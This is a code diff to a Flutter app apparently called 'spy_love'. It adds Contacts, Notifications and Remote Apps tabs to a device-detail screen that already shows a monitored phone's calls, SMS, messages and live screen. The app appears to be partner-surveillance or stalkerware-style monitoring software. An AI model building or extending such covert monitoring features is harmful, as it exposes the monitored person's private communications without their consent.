@@ -14,7 +14,9 @@ import 'package:spy_love/shared/widgets/timestamp_label.dart';
 import 'package:spy_love/features/devices/controllers/device_detail_controller.dart';
 import 'package:spy_love/features/devices/models/device_event_model.dart';
 import 'package:spy_love/features/devices/views/activity_feed_tab.dart';
-import 'package:spy_love/features/devices/views/app_usage_tab.dart';
+import 'package:spy_love/features/devices/views/contacts_tab.dart';
+import 'package:spy_love/features/devices/views/notifications_tab.dart';
+import 'package:spy_love/features/devices/views/remote_apps_tab.dart';
 import 'package:spy_love/features/devices/views/device_care_tab.dart';
 import 'package:spy_love/features/devices/views/event_detail_view.dart';
 import 'package:spy_love/features/monitoring/screen_share/live_screen_tab.dart';
@@ -35,7 +37,7 @@ class DeviceDetailView extends StatelessWidget {
     final tokens = context.tokens;
 
     return DefaultTabController(
-      length: 9,
+      length: 11,
       child: Scaffold(
         appBar: AppBar(
           toolbarHeight: 72,
@@ -61,6 +63,8 @@ class DeviceDetailView extends StatelessWidget {
               const Tab(text: 'Calls'),
               const Tab(text: 'SMS'),
               const Tab(text: 'Messages'),
+              const Tab(text: 'Contacts'),
+              const Tab(text: 'Notifications'),
               const Tab(text: 'Apps'),
               const Tab(text: 'Live screen'),
             ],
@@ -154,8 +158,17 @@ class DeviceDetailView extends StatelessWidget {
                   companionCount: controller.uniqueMessageApps,
                   onOpen: (event) => _openEvent(controller, event),
                 ),
-                AppUsageTab(
-                  events: controller.appUsageEvents,
+                ContactsTab(
+                  snapshot: controller.contactsSnapshot,
+                  isLoading: controller.isLoadingEvents,
+                ),
+                NotificationsTab(
+                  events: controller.notifications,
+                  isLoading: controller.isLoadingEvents,
+                ),
+                RemoteAppsTab(
+                  inventory: controller.appInventorySnapshot,
+                  usageEvents: controller.appUsageEvents,
                   isLoading: controller.isLoadingEvents,
                 ),
                 LiveScreenTab(deviceId: controller.device.id),
